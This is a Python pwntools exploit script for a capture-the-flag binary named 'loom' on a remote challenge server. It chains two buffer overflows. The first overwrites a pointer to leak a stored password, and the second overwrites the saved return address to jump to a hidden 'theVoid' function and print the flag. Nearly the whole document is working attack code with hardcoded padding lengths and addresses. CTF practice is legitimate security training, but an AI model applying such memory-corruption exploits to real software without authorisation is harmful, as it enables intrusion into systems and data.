#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./loom")
libc = None
context.binary = exe


PADDING = b'A' * 152


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("0.cloud.chals.io", 33616)

    return r


def leak_password() -> str:
    r.sendlineafter(b'\n\n', b'1')              # LoomRoom
    r.sendlineafter(b'\n\n', b'1')              # 'Yes'
    r.sendline(b'A' * 280 + p64(0x40232a))      # Overwrite returned pointer so it points to the password
    sleep(5)        # Make it wait (program outputs a bunch of errors repeatetly)

    r.clean()               # Clean the previous mess
    r.sendline(b'2')        # Print function

    psw = r.recvlinesS(6)[-1]
    log.warn(f'Password leaked: {psw}')

    return psw


def ret2win(psw: str):
    win = exe.symbols['theVoid']

    r.sendlineafter(b'\n\n', b'1')      # LoomRoom
    r.sendlineafter(b'\n\n', b'1')      # 'Yes'
    r.sendline(PADDING + p64(win))      # Overwrite stored RIP with 'win' function
    r.sendlineafter(b'\n\n', b'3')      # FatesRoom
    r.sendlineafter(b'\n\n', psw.encode('ascii'))   # We got the password so we can get in
    r.clean()           # Clean the previous mess
    r.sendline(b'1')    # Accept
    r.recvuntil(b'Ok. Well. It\'s yours.\n\n', drop=False)

    flag = r.recvlineS()
    log.warn(f'Flag obtained: {flag}')


def main():
    r = conn()

    psw = leak_password()
    ret2win(psw)


if __name__ == "__main__":
    main()
